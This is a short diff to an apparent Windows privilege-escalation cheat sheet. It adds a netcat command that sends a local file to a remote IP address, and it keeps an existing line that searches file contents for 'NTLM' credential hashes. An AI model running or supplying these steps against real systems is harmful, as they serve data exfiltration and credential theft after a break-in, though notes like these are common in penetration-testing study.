@@ -1,4 +1,9 @@
 # Windows Privilege Escalation
+## use nc to transfer files
+```powershell
+nc 10.10.10.10 80 < file.txt
+```
+
 ## findstr
 ```powershelll
 type <file> | findstr 'NTLM'
